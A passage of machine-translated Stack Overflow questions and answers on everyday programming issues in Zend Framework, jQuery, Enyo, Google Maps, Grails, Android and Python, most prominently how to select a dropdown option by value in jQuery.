    '/articles/search/*',
    '/search/',
    array('persist' => true)
); 
```

# php - 如何从 Zend Framework 2 中的 Zend\Validator\Identical 返回自定义的“isEmpty”错误消息？

> ID：13343556
> 
> 赞同：4
> 
> 时间：2012-11-12T12:15:21.200
> 
> 标签：php, zend-framework2, zend-validate, zend-inputfilter

> **可能重复：**
> [zendframework 2 inputfilter自定义默认错误消息](https://stackoverflow.com/questions/12724653/zendframework-2-inputfilter-customize-default-error-message)

我正在尝试使用 Zend\InputFilter\InputFilter 来验证来自注册表单的输入。我有下面的代码：

1.  验证“电子邮件”字段中的电子邮件地址；然后
2.  检查“email_confirm”中的值是否与“email”中的值匹配。

这适用于所有情况，除了用户将两个字段都留空时。在那种情况下，'email_confirm' 的验证器会返回错误`Array ( [isEmpty] => Value is required and can't be empty )`。

**如何自定义此错误消息？**我无法使用以下方式设置它：

```
'messages' => array(
    'isEmpty' => 'Message Here' 
), 
```

因为这会引发一个异常，说（非常正确） Zend\Validator\Identical 没有“isEmpty”的消息模板。而且它不会接收我之前为“电子邮件”字段设置的消息，否则它会返回`Array ( [isEmpty] => Please enter your email address )`.

```
$this->add($inputFactory->createInput(array(
    'name' => 'email',
    'required' => true,
    'filters' => array(
        array('name' => 'StripTags'),
        array('name' => 'StringTrim'),
    ),
    'validators' => array(
        array(
          'name' =>'NotEmpty', 
            'options' => array(
                'messages' => array(
                    'isEmpty' => 'Please enter your email address' 
                ),
            ),
        ),
        array(
            'name' => 'StringLength',
            'options' => array(
                'encoding' => 'UTF-8',
                'max' => 200,
                'messages' => array(
                    'stringLengthTooLong' => "Email addresses cannot be more than 200 characters"
                ),
            ),
        ),
        array(
          'name' =>'EmailAddress', 
            'options' => array(
                'useMxCheck'    => true,
            ),
        ),                
    ),
))); 

$this->add($inputFactory->createInput(array(
    'name' => 'email_confirm',
    'required' => true,
    'filters' => array(
        array('name' => 'StripTags'),
        array('name' => 'StringTrim'),
    ),
    'validators' => array(
        array(
            'name' => 'Identical',                        
            'options' => array(
                'token' => 'email',
                'messages' => array(
                     'notSame' => "Your email addresses do not match, please try again",
                ),
            ),
        ),               
    ),
))); 
```

谢谢，尼尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:38:59.010

您必须以`Zend\Validator\NotEmpty::IS_EMPTY`这种方式使用常量：

```
array(
    'name' =>'NotEmpty', 
        'options' => array(
            'messages' => array(
                \Zend\Validator\NotEmpty::IS_EMPTY => 'Please enter your email address' 
        ),
    ),
), 
```

您可以查看[API](http://framework.zend.com/apidoc/2.0/classes/Zend.Validator.NotEmpty.html)以获取更多信息。

**编辑**

深入 Zend\Validator\NotEmpty 源代码，我发现`IS_EMPTY`常量具有`'isEmpty'`价值，因此它不会解决您的问题。无论如何，您*应该*使用这些常量而不是直接值，以避免可能的更新问题。

# javascript - 如何将对象的副本传递给 $.ajax 的 .done() 中的函数？

> ID：13343557
> 
> 赞同：2
> 
> 时间：2012-11-12T12:15:22.577
> 
> 标签：javascript, ajax, jquery, typescript

我有以下代码：

```
function doDialogAjax(link: Link. modal: Modal) {
    $.ajax( link.Url,
    {
        cache: false,
        dataType: 'html'
    })
        .done(onDialogDone)
        .fail(onDialogFail);
}

function onDialogDone(data: any, textStatus: string, jqXHR: JQueryXHR) {
    var x = data;
    // I need to access link.abc and modal.def properties here
} 
```

如何将链接对象发送到我的 onDialogDone() 函数？我似乎记得有一些方法可以发送指定的上下文信息对象，但我找不到任何这样的例子。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:19:23.533

您可以使用上下文键来更改`this`回调内部的值：

```
function doDialogAjax(link: Link. modal: Modal) {
    $.ajax( link.Url,
    {
        cache: false,
        dataType: 'html',
        context: {
           link: link,
           modal: modal
        }
    })
        .done(onDialogDone)
        .fail(onDialogFail);
}

function onDialogDone(data: any, textStatus: string, jqXHR: JQueryXHR) {
    var x = data;
    // this refers to the context-object, with keys [link, modal]
    console.log(this.link);
    console.log(this.modal)
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-12T12:18:21.307

```
.done(onDialogDone({link : link, modal : modal}, 'success', data)) 
```

像这样的东西？

# javascript - 在 Enyo 2.0 中使用 SVG 控件处理事件（对象或嵌入标签）

> ID：13343560
> 
> 赞同：4
> 
> 时间：2012-11-12T12:15:46.257
> 
> 标签：javascript, html, events, svg, enyo

我有这个用于加载 SVG 文档的控件（有效，SVG 显示正常）

```
enyo.kind({
    name: "SvgParser",
    kind:"Control",
    fit: true,
    published: {
        source:''
    },
    components:[{ 
        tag: "object", // Or Embed
        name:'svgObject', 
        classes: 'SvgObject',
        ontap:'click',
        onload:'loaded'
    }],
    create: function() {
        this.inherited(arguments);
        this.sourceChanged();
    },
    click: function(inSender, inEvent) {
        console.log('click'); // doesn't happen
    },
    sourceChanged: function() {
         this.$.svgObject.attributes.type = 'image/svg+xml';
         this.$.svgObject.attributes.data = this.source;
    },
    loaded: function(inSender, inEvent) {
         console.log('loaded'); // doesn't happen
    }
}); 
```

但是'tap'和'load'的事件处理程序永远不会被触发，有人可以解释我做错了什么吗？提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T13:38:44.507

您实际上有两个不同的问题，一个阻止`load`处理程序工作，另一个阻止`tap`处理程序工作。

处理程序没有被调用，`load`因为您需要告诉 Enyo 监听标签`load`上的事件。`<object>`您可以通过调用 来做到这一点`enyo.makeBubble()`。

处理程序没有被调用，因为包含 SVG 图像的标签上的`tap`点击/点击事件`<object>`被路由到图像本身的 DOM 中。要在 HTML 中拦截它们，您需要将 包裹`<object>`在一个透明的中`<div>`并给出`<object>`一个否定的`z-index`。

我在这里做了一个小提琴来说明这两种技术：http: [//jsfiddle.net/rbWMr/](http://jsfiddle.net/rbWMr/)

有关 SVG 包装技术的背景信息，请参阅[使用 onclick 使 svg 图像对象可点击，避免绝对定位](https://stackoverflow.com/questions/2296097/making-an-svg-image-object-clickable-with-onclick-avoiding-absolute-positioning)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T06:30:42.547

未触发事件是因为您在尚未创建 Enyo 组件的 DOM 节点时尝试修改 DOM 节点属性。渲染组件时会创建 DOM 节点。将你的 sourceChanged() 函数移动到控件的 render() 函数，或者如果你在控件的 create() 函数中需要它，请在控件上调用 hasNode() 以强制它首先创建 DOM 节点。试试这个版本的 sourceChanged() 函数，看看它是否有效：

```
sourceChanged: function() {
    var svgObj = this.$.svgObject;
    if (svgObj.hasNode()) {
       svgObj.setAttribute("type", 'image/svg+xml');
       svgObj.setAttribute("data", this.source);
    }
}, 
```

# javascript - Google Maps API V3 未定义的地理编码器错误

> ID：13343564
> 
> 赞同：0
> 
> 时间：2012-11-12T12:16:08.847
> 
> 标签：javascript, google-maps-api-3

所以我有一个本质上是为移动网站设计的定制“场地定位器”。这是一项正在进行的工作，但直到今天一直运行得非常完美（一个多月）。现在，当我点击我的搜索按钮时，我在声明地理编码器的地方遇到了一个未定义的错误：

```
var geocoder = new google.maps.Geocoder(); 
```

今天对外部的css和js做了一些改动，但是文档本身的js没有改动。我确实对 html 标记进行了一些更改，但肯定没有任何可能导致此错误。

我已经尝试编写一个在页面加载后调用的初始化函数，并在其中包括我的地图创建和地理编码器声明 - 正如我所读到的那样，当地图 API 没有完全加载时经常会出现这个问题 - 但它到目前为止还没有工作；事实上，我已经尝试了在这里和其他论坛的其他线程中可以找到的所有内容，但也无济于事。有时，在我进行故障排除时，我也会从 Google Maps main.js 文件中抛出错误。

我不明白过去一个月我怎么能有零错误，而现在，突然，这个。如果有人愿意看一下，该页面位于[http://www.quizmeisters.com.au/mobile-test/find.html](http://www.quizmeisters.com.au/mobile-test/find.html)

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T14:59:37.627

有几点需要注意：

*   将您的代码回滚到以前的版本并检查它是否有效。然后开始一次更改一项（更改->检查；更改->检查）。
*   您的链接中没有地图。您搜索 a `div`with `id`= `map`，但我在您的代码中找不到此元素。
*   头部中的脚本可能在您的页面准备好之前执行。

# jquery - 按值设置选择选项“已选择”

> ID：13343566
> 
> 赞同：1132
> 
> 时间：2012-11-12T12:16:17.003
> 
> 标签：jquery, jquery-selectors, html-select

我有一个`select`包含一些选项的字段。现在我需要`options`用 jQuery 选择其中之一。但是，当我只知道必须选择`value`的那个时，我该怎么做呢？`option`

我有以下 HTML：

```
<div class="id_100">
  <select>
    <option value="val1">Val 1</option>
    <option value="val2">Val 2</option>
    <option value="val3">Val 3</option>
  </select>
</div> 
```

我需要选择带有 value 的选项`val2`。如何才能做到这一点？

这是一个演示页面：http: [//jsfiddle.net/9Stxb/](http://jsfiddle.net/9Stxb/)

* * *

## 回答 #1

> 赞同：1793
> 
> 时间：2013-06-07T08:49:48.027

有一种更简单的方法，不需要您进入选项标签：

```
$("div.id_100 select").val("val2"); 
```

查看这个[jQuery 方法](http://api.jquery.com/val/)。

**注意**：上面的代码不会触发更改事件。为了完全兼容，您需要这样称呼它：

```
$("div.id_100 select").val("val2").change(); 
```

* * *

## 回答 #2

> 赞同：508
> 
> 时间：2012-11-12T12:17:20.977

要选择值为“val2”的选项：

```
$('.id_100 option[value=val2]').attr('selected','selected'); 
```

* * *

## 回答 #3

> 赞同：413
> 
> 时间：2015-10-21T06:22:40.273

选择值后使用`change()`事件。从文档：

> 如果该字段在内容未更改的情况下失去焦点，则不会触发该事件。要手动触发事件，请`.change()`不带参数应用：

```
$("#select_id").val("val2").change(); 
```

更多信息在*[.change()](https://api.jquery.com/change/)*。

* * *

## 回答 #4

> 赞同：64
> 
> 时间：2012-11-12T12:20:20.443

首先取消全选并过滤可选选项：

```
$('.id_100 option')
     .removeAttr('selected')
     .filter('[value=val1]')
         .attr('selected', true) 
```

* * *

## 回答 #5

> 赞同：44
> 
> 时间：2013-12-05T17:27:27.037

```
<select name="contribution_status_id" id="contribution_status_id" class="form-select">
    <option value="1">Completed</option>
    <option value="2">Pending</option>
    <option value="3">Cancelled</option>
    <option value="4">Failed</option>
    <option value="5">In Progress</option>
    <option value="6">Overdue</option>
    <option value="7">Refunded</option> 
```

按值设置为待处理状态

```
 $('#contribution_status_id').val("2"); 
```

* * *

## 回答 #6

> 赞同：38
> 
> 时间：2016-07-27T13:27:55.063

对我来说，以下工作完成了

```
$("div.id_100").val("val2").change(); 
```

* * *

## 回答 #7

> 赞同：29
> 
> 时间：2013-09-07T22:40:49.160

我认为最简单的方法是选择设置 val()，但您可以检查以下内容。请参阅*[如何在 jQuery 中处理选择和选项标签？](http://mycodeprograms.blogspot.in/2013/09/how-to-handle-select-and-option-tag-in.html)*有关选项的更多详细信息。

```
$('div.id_100  option[value="val2"]').prop("selected", true);

$('id_100').val('val2'); 
```

未优化，但以下逻辑在某些情况下也很有用。

```
$('.id_100 option').each(function() {
    if($(this).val() == 'val2') {
        $(this).prop("selected", true);
    }
}); 
```

* * *

## 回答 #8

> 赞同：26
> 
> 时间：2019-03-11T17:55:54.407

最好的方法是这样的：

```
$(`#YourSelect option[value='${YourValue}']`).prop('selected', true); 
```

* * *

## 回答 #9

> 赞同：20
> 
> 时间：2017-12-09T17:13:32.620

一个简单的答案是，在 html

```
<select name="ukuran" id="idUkuran">
    <option value="1000">pilih ukuran</option>
    <option value="11">M</option>
    <option value="12">L</option>
    <option value="13">XL</option>
</select> 
```

在 jquery 上，通过按钮或其他方式调用以下函数

```
$('#idUkuran').val(11).change(); 
```

它简单且 100% 有效，因为它取自我的工作...... :) 希望它的帮助..

* * *

## 回答 #10

> 赞同：19
> 
> 时间：2020-08-17T04:59:24.350

您可以使用不同的方法来实现这一点：（
请记住，如果要操作一个元素，最好给它一个 id 或类，而不是让它的父元素一个 id 或类）。
在这里，由于 div 有一个类来定位其中的选择，代码将是：

```
$("div.id_100 select").val("val2"); 
```

或者

```
$('div.id_100  option[value="val2"]').prop("selected", true); 
```

如果该类将被赋予选择自身，则代码将是：

```
$(".id_100").val("val2"); 
```

或者

```
$('.id_100 option[value=val2]').attr('selected','selected'); 
```

或者

```
$('.id_100 option')
    .removeAttr('selected')
    .filter('[value=val1]')
    .attr('selected', true); 
```

要动态传递值，代码将是：
valu="val2";

```
$("div.id_100 select").val(valu);
$("div.id_100 > select > option[value=" + valu + "]").prop("selected",true); 
```

如果元素是通过 ajax 添加的，则必须为元素提供“id”并使用
window.document.getElementById 否则，您必须为元素提供“class”并使用
window.document.getElementById

您还可以通过它的索引号选择选择元素的值。
如果您为您的选择元素提供了 ID，则代码将是：

```
window.document.getElementById('select_element').selectedIndex = 4; 
```

请记住，当您如上所述更改选择值时，不会调用更改方法。
即，如果您编写了代码来更改选择，则上述方法将更改选择值但不会触发更改。
要触发更改功能，您必须在最后添加 .change() 。所以代码将是：

```
$("#select_id").val("val2").change(); 
```

* * *

## 回答 #11

> 赞同：18
> 
> 时间：2012-11-12T12:22:16.320

您可以使用属性选择器选择任何属性及其值`[attributename=optionalvalue]`，因此在您的情况下，您可以选择选项并设置选定的属性。

```
$("div.id_100 > select > option[value=" + value + "]").prop("selected",true); 
```

`value`您希望选择的值在哪里。

如果您需要删除任何先前选择的值，就像多次使用的情况一样，您需要稍微更改它以便首先删除选定的属性

```
$("div.id_100 option:selected").prop("selected",false);
$("div.id_100 option[value=" + value + "]")
        .prop("selected",true); 
```

* * *

## 回答 #12

> 赞同：18
> 
> 时间：2018-03-03T09:41:03.363

没有理由过度考虑这一点，您所做的只是访问和设置属性。就是这样。

**好的，一些基本的 dom：** 如果你是直接用 JavaScript 做的，你会这样：

```
window.document.getElementById('my_stuff').selectedIndex = 4; 
```

但是你不是用直接的 JavaScript 来做的，你是用 jQuery 做的。在 jQuery 中，你想使用 .prop() 函数来设置一个属性，所以你可以这样做：

```
$("#my_stuff").prop('selectedIndex', 4); 
```

无论如何，只要确保您的 id 是唯一的。否则，你会用头撞墙，想知道为什么这不起作用。

* * *

## 回答 #13

> 赞同：13
> 
> 时间：2015-12-02T07:23:22.437

最简单的方法是：

### HTML

```
<select name="dept">
   <option value="">Which department does this doctor belong to?</option>
   <option value="1">Orthopaedics</option>
   <option value="2">Pathology</option>
   <option value="3">ENT</option>
</select> 
```

### jQuery

```
$('select[name="dept"]').val('3'); 
```

> 输出：这将激活**ENT**。

* * *

## 回答 #14

> 赞同：12
> 
> 时间：2017-06-06T08:56:23.550

最好`change()`在设置选择值后使用。

```
$("div.id_100 select").val("val2").change(); 
```

* * *

通过这样做，代码将接近于更改用户选择，解释包含在[JS Fiddle](http://jsfiddle.net/9Stxb/2838/)中：

[JS小提琴](http://jsfiddle.net/9Stxb/2838/)

* * *

## 回答 #15

> 赞同：12
> 
> 时间：2018-01-16T06:51:27.787

`$('#graphtype option[value=""]').prop("selected", true);`

这很好`#graphtype`用，选择标签的 id 在哪里。

示例选择标签：

```
 <select name="site" id="site" class="form-control" onchange="getgraph1(this.options[this.selectedIndex].value);">
    <option value="" selected>Site</option> 
    <option value="sitea">SiteA</option>
    <option value="siteb">SiteB</option>
  </select> 
```

* * *

## 回答 #16

> 赞同：8
> 
> 时间：2014-03-16T08:42:25.500

采用：

```
$("div.id_100 > select > option[value=" + value + "]").attr("selected",true); 
```

这对我有用。我正在使用此代码来解析fancybox 更新表单中的值，而我来自 app.js 的完整来源是：

```
jQuery(".fancybox-btn-upd").click(function(){
    var ebid = jQuery(this).val();

    jQuery.ajax({
        type: "POST",
        url: js_base_url+"manajemen_cms/get_ebook_data",
        data: {ebookid:ebid},
        success: function(transport){
            var re = jQuery.parseJSON(transport);
            jQuery("#upd-kategori option[value="+re['kategori']+"]").attr('selected',true);
            document.getElementById("upd-nama").setAttribute('value',re['judul']);
            document.getElementById("upd-penerbit").setAttribute('value',re['penerbit']);
            document.getElementById("upd-tahun").setAttribute('value',re['terbit']);
            document.getElementById("upd-halaman").setAttribute('value',re['halaman']);
            document.getElementById("upd-bahasa").setAttribute('value',re['bahasa']);

            var content = jQuery("#fancybox-form-upd").html();
            jQuery.fancybox({
                type: 'ajax',
                prevEffect: 'none',
                nextEffect: 'none',
                closeBtn: true,
                content: content,
                helpers: {
                    title: {
                        type: 'inside'
                    }
                }
            });
        }
    });
}); 
```

我的PHP代码是：

```
function get_ebook_data()
{
    $ebkid = $this->input->post('ebookid');
    $rs = $this->mod_manajemen->get_ebook_detail($ebkid);
    $hasil['id'] = $ebkid;
    foreach ($rs as $row) {
        $hasil['judul'] = $row->ebook_judul;
        $hasil['kategori'] = $row->ebook_cat_id;
        $hasil['penerbit'] = $row->ebook_penerbit;
        $hasil['terbit'] = $row->ebook_terbit;
        $hasil['halaman'] = $row->ebook_halaman;
        $hasil['bahasa'] = $row->ebook_bahasa;
        $hasil['format'] = $row->ebook_format;
    }
    $this->output->set_output(json_encode($hasil));
} 
```

* * *

## 回答 #17

> 赞同：8
> 
> 时间：2014-12-15T07:25:23.153

```
var opt = new Option(name, id);
$("#selectboxName").append(opt);
opt.setAttribute("selected","selected"); 
```

* * *

## 回答 #18

> 赞同：7
> 
> 时间：2016-09-08T04:40:50.273

.attr() 有时在旧 jQuery 版本中不起作用，但您可以使用**.prop()**：

```
$('select#ddlCountry option').each(function () {
    if ($(this).text().toLowerCase() == co.toLowerCase()) {
        $(this).prop('selected','selected');
        return;
    }
}); 
```

* * *

## 回答 #19

> 赞同：5
> 
> 时间：2020-04-06T12:55:19.930

这个对我有用

```
$("#id_100").val("val2"); 
```

* * *

## 回答 #20

> 赞同：4
> 
> 时间：2015-11-26T05:02:28.797

这肯定适用于**Select Control**：

```
$('select#ddlCountry option').each(function () {
if ($(this).text().toLowerCase() == co.toLowerCase()) {
    this.selected = true;
    return;
} }); 
```

* * *

## 回答 #21

> 赞同：3
> 
> 时间：2017-11-20T17:13:10.000

试试这个。简单而有效的 javaScript + jQuery 致命组合。

选择组件：

```
<select id="YourSelectComponentID">
            <option value="0">Apple</option>
            <option value="2">Banana</option>
            <option value="3">Cat</option>
            <option value="4">Dolphin</option>
</select> 
```

选择：

```
document.getElementById("YourSelectComponentID").value = 4; 
```

现在您的选项 4 将被选中。您可以这样做，默认情况下选择启动时的值。

```
$(function(){
   document.getElementById("YourSelectComponentID").value = 4;
}); 
```

或创建一个简单的函数将行放入其中并在 anyEvent 上调用该函数以选择选项

jQuery + javaScript 的混合具有魔力......

* * *

## 回答 #22

> 赞同：3
> 
> 时间：2018-01-16T09:58:59.843

是旧帖子，但这是一个类似于 jQuery 插件的简单功能。

```
 $.fn.selectOption = function(val){
        this.val(val)
        .find('option')
        .removeAttr('selected')
        .parent()
        .find('option[value="'+ val +'"]')
        .attr('selected', 'selected')
        .parent()
        .trigger('change');

        return this;
    }; 
```

你只是简单地可以做这样的事情：

```
$('.id_100').selectOption('val2'); 
```

Reson 为什么使用它是因为您将选定的语义更改为跨浏览器支持的 DOM，并且还会触发您可以捕获它的更改。

基本上是人体动作模拟。

* * *

## 回答 #23

> 赞同：3
> 
> 时间：2021-03-08T01:24:42.627

这里有很多解决方案可以更改所选值，但没有一个对我有用，因为我的挑战与 OP 略有不同。我需要根据此值过滤另一个选择下拉列表。

大多数人过去常常`$("div.id_100").val("val2").change();`让它为他们工作。我不得不将其稍微修改为`$("div#idOfDiv select").val("val2").trigger("change")`.

这也不够，我还必须确保等待文件加载。我的完整代码如下所示：

```
$(document).ready(function() {
    $("div#idOfDiv select").val("val2").trigger("change");
}); 
```

我希望这可以帮助有同样挑战的人！

* * *

## 回答 #24

> 赞同：1
> 
> 时间：2019-05-04T19:25:12.840

当控件是动态创建而不是在静态 HTML 页面中时，选择下拉控件似乎没有动态更改。

在 jQuery 中，这个解决方案对我有用。

```
$('#editAddMake').val(result.data.make_id);
$('#editAddMake').selectmenu('refresh'); 
```

就像附录一样，第一行代码没有第二行，实际上确实透明地工作，在设置索引后检索选定的索引是正确的，如果您实际单击控件，它将显示正确的项目，但这并没有反映在控件的顶部标签中。

希望这可以帮助。

* * *

## 回答 #25

> 赞同：1
> 
> 时间：2019-08-14T17:31:24.470

当值是 ID 而文本是代码时，我遇到了一个问题。您无法使用代码设置值，但您无法直接访问 ID。

```
var value;

$("#selectorId > option").each(function () {
  if ("SOMECODE" === $(this).text()) {
    value = $(this).val();
  }
});

//Do work here 
```

* * *

## 回答 #26

> 赞同：0
> 
> 时间：2021-05-20T17:05:14.593

我需要选择一个选项，但两个选项可能具有相同的值。
这纯粹是为了视觉（前端）差异。
您可以选择一个选项（即使 2 具有相同的值），如下所示：

```
let options = $('#id_100 option')
options.prop('selected', false)   // Deselect all currently selected ones
let option = $(options[0])        // Select option from the list
option.prop('selected', true)
option.parent().change()          // Find the <select> element and call the change() event. 
```

这将取消选择所有当前选定`<option>`的元素。选择第一个（使用）并使用事件`options[0]`更新`<select>`元素。`change`

# javascript - 对 Javascript 与 Actionscript 进行基准测试

> ID：13343567
> 
> 赞同：0
> 
> 时间：2012-11-12T12:16:19.173
> 
> 标签：javascript, benchmarking, javascript-engine

是否有用于对 Javascript 引擎与其他技术进行基准测试的标准代码片段？

您能否链接到此处描述的 JS 基准测试片段[http://blogs.adobe.com/avikchaudhuri/2012/01/17/the-v8-myth-why-javascript-is-not-a-worthy-competitor/](http://blogs.adobe.com/avikchaudhuri/2012/01/17/the-v8-myth-why-javascript-is-not-a-worthy-competitor/)

*   索尔
*   LUF 事实
*   堆排序
*   快速傅里叶变换
*   地穴

# facebook - 如何使用 Grails 将图像发布到 Facebook 墙上

> ID：13343569
> 
> 赞同：0
> 
> 时间：2012-11-12T12:16:24.143
> 
> 标签：facebook, facebook-graph-api, grails, grails-plugin, grails-2.0

我正在使用 grails facebook-sdk 插件连接并发布到 facebook。

要将消息发布到用户的墙上，我使用：

```
def publishMessageResponse = facebookClient.publish("me/feed", [message:"RestFB test"]) 
```

这很好用，但我想将图像发布到用户的特定相册。该文档说它应该与：

```
def publishPhotoResponse = facebookClient.publishFile("me/photos", [message, "Test cat"], "/cat.png") 
```

但我总是收到“找不到文件”错误。我拥有的图像存储在数据库中，可以通过获取图像的 url 来检索。

知道图片的 url，我如何将这张图片发布到特定的用户相册？如何创建新专辑？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T13:22:33.277

我没有使用 facebook-sdk，但我认为问题在于它找不到相对于您项目位置的文件“/cat.png”。您需要提供有效且可访问的文件路径。

您可以通过在 publishFile 之前执行类似的操作来确认这一点...

```
assert new File("/cat.png").exists(), "File does not exist!" 
```

更新：

这是将 url 转换为文件的示例。 如果除了使用实际文件之外还有其他选项，**这可能不是理想的解决方案。**

```
 def someUrl = "http://www.google.com/images/logo.gif";
    def file = File.createTempFile("facebookUpload",".temp").withOutputStream { out ->
        out << new URL(someUrl).openStream()
    }

    file.deleteOnExit();
    def publishPhotoResponse = facebookClient.publishFile("me/photos", [message, "Test cat"], file) 
```

# android - 纵向视图中的相机问题

> ID：13343572
> 
> 赞同：1
> 
> 时间：2012-11-12T12:16:43.117
> 
> 标签：android, android-camera

我在我的应用程序中使用 Android 的默认相机。拍照后，我将其显示在图像视图中。当照片以横向模式拍摄时，它应该出现在图像视图中，但当以纵向视图拍摄同一张照片时，它会旋转 90 度。是否可以通过代码检测相机模式（横向或纵向）？

# android - 我无法访问我所在位置的纬度和经度。为什么？

> ID：13343573
> 
> 赞同：0
> 
> 时间：2012-11-12T12:16:44.507
> 
> 标签：android, map, error-handling

我想计算两点之间的距离，但是当我使用 .distanceto 函数时，程序出错并说 android.location.Location 与同一文件中定义的类型冲突。我通过数学规则计算距离，但是当我给出我所在位置的纬度和经度时，当程序运行时，程序已经停止。为什么？我很困惑。

```
public class Location extends MapActivity {
double myLatitude=0;
double myLongitude=0;
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.location);

    initMapView();
    initMyLocation();
    }
    private void initMyLocation() {
    final MyLocationOverlay overlay = new MyLocationOverlay(this, map);
    overlay.enableMyLocation();
    overlay.enableCompass(); 
    //
    mylocation=overlay.getMyLocation();
    overlay.runOnFirstFix(new Runnable() {
        public void run() {
            controller.setZoom(13);
            controller.animateTo(overlay.getMyLocation());
        }
    });

            //THIS is ERROR . WHY?
    myLatitude=(overlay.getMyLocation().getLatitudeE6())/1e6;
    myLongitude=(overlay.getMyLocation().getLongitudeE6())/1e6;
}
} 
```

日志猫：

```
11-12 15:29:57.974: W/dalvikvm(688): threadid=1: thread exiting with uncaught exception (group=0x40a891f8)
11-12 15:29:57.982: E/AndroidRuntime(688): FATAL EXCEPTION: main
11-12 15:29:57.982: E/AndroidRuntime(688): java.lang.RuntimeException: Unable to start activity ComponentInfo{org.example.loyaltier/org.example.loyaltier.Location}: java.lang.NullPointerException
11-12 15:29:57.982: E/AndroidRuntime(688):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1955)
11-12 15:29:57.982: E/AndroidRuntime(688):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1980)
11-12 15:29:57.982: E/AndroidRuntime(688):  at android.app.ActivityThread.access$600(ActivityThread.java:122)
11-12 15:29:57.982: E/AndroidRuntime(688):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1146)
11-12 15:29:57.982: E/AndroidRuntime(688):  at android.os.Handler.dispatchMessage(Handler.java:99)
11-12 15:29:57.982: E/AndroidRuntime(688):  at android.os.Looper.loop(Looper.java:137)
11-12 15:29:57.982: E/AndroidRuntime(688):  at android.app.ActivityThread.main(ActivityThread.java:4340)
11-12 15:29:57.982: E/AndroidRuntime(688):  at java.lang.reflect.Method.invokeNative(Native Method)
11-12 15:29:57.982: E/AndroidRuntime(688):  at java.lang.reflect.Method.invoke(Method.java:511)
11-12 15:29:57.982: E/AndroidRuntime(688):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
11-12 15:29:57.982: E/AndroidRuntime(688):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
11-12 15:29:57.982: E/AndroidRuntime(688):  at dalvik.system.NativeStart.main(Native Method)
11-12 15:29:57.982: E/AndroidRuntime(688): Caused by: java.lang.NullPointerException
11-12 15:29:57.982: E/AndroidRuntime(688):  at org.example.loyaltier.Location.initMyLocation(Location.java:164)
11-12 15:29:57.982: E/AndroidRuntime(688):  at org.example.loyaltier.Location.onCreate(Location.java:61)
11-12 15:29:57.982: E/AndroidRuntime(688):  at android.app.Activity.performCreate(Activity.java:4465)
11-12 15:29:57.982: E/AndroidRuntime(688):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)
11-12 15:29:57.982: E/AndroidRuntime(688):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1919)
11-12 15:29:57.982: E/AndroidRuntime(688):  ... 11 more 
```

谢谢。干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:20:48.960

**您的位置为 NULL**使用下面的代码

```
 if(mylocation!= null) 
{
      myLatitude=(overlay.getMyLocation().getLatitudeE6())/1e6;
    myLongitude=(overlay.getMyLocation().getLongitudeE6())/1e6;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:34:24.557

已经有一个名为 Location 的类。

将其重命名为`MyLocation`或其他内容应该可以解决此问题。

# php - 动态表单部分中的多个表单元素

> ID：13343576
> 
> 赞同：1
> 
> 时间：2012-11-12T12:17:10.273
> 
> 标签：php, html, forms

我正在构建一个表单，用户需要能够添加多个“孩子”并为他们填写详细信息。每个孩子都有多个输入，所以为了简单起见，我们会说一个用户正在尝试添加 2 个孩子，每个孩子都需要一个名字和一个姓氏。

我的目标是使用 javascript 将孩子添加到列表中，以便用户可以输入名字和姓氏，然后按“添加”，这将为这些详细信息创建隐藏输入。我正在努力使这些表单输入按子级有效地分组，我最终得到的将是一个 $_POST 数组，如下所示：

```
$_POST['child'][0]['firstname'] = 'asdads';
$_POST['child'][0]['surname'] = 'vcbcvbc';
$_POST['child'][1]['firstname'] = 'asdads';
$_POST['child'][1]['surname'] = 'vcbcvbc'; 
```

是否像将输入上的“名称”属性设置为 name="child[][firstname]" 一样简单，或者有人可以提供合适的解决方案吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T13:03:01.283

javascript:

```
var children = [[{name:value},{name:value}],[{name:value},{name:value}],....]; 
```

php:

```
for($i=0; $i<sizeof($_POST['children']); $i++)
{
    foreach($_POST['children'][$i] as name => value)
    {
          // process
    }
} 
```

# python - input() + TypeError: 'dict' 对象不可调用

> ID：13343577
> 
> 赞同：3
> 
> 时间：2012-11-12T12:17:10.683
> 
> 标签：python, dictionary, python-3.x, typeerror

最近我开始学习 python，这将是我的第一个“有用”脚本（简单的单词学习脚本）。但由于某种原因，它让我发疯。如果我在 start_lesson 中放置一个简单的 'input()'，我会得到一个“TypeError: 'dict' object is not callable”，但在这种情况下它是无关紧要的（对我来说是 alteast）。

谢谢！

```
# -*- coding: utf-8 -*-

import sys
import random

szavak = {"meddle" : "beleavatkozik", "perilous" : "veszedelmes", "wail" : "jajgat", "sill" : "párkány", "hale" : "egészséges", "dawdle" : "cselleng", "stubbornly" : "makacsul", "waylay" : "kirabol", "fervor" : "buzgalom", "sorrow" : "bánat", "behest" : "parancs", "precipice" : "szakadék", "belatedly" : "késve", "hindsighth" : "Hindsighth", "dove" : "galamb", "guffaw" : "röhögés", "jouster" : "lovag", "repented" : "megbánta", "solemnly" : "ünnepélyesen", "concubine" : "ágyastárs", "fodder" : "takarmány", "treacherous" : "áruló", "anticipated" : "várható", "chivalrous" : "lovagias", "amidst" : "között", "antler" : "agancs", "notion" : "fogalom", "sow" : "koca", "surefooted" : "magabiztos", "adamant" : "hajthatatlan", "rout" : "csődület", "shrieks" : "sikoly", "parapet" : "korlát", "crutch" : "mankó", "clutched" : "szorította", "squint" : "kancsalság", 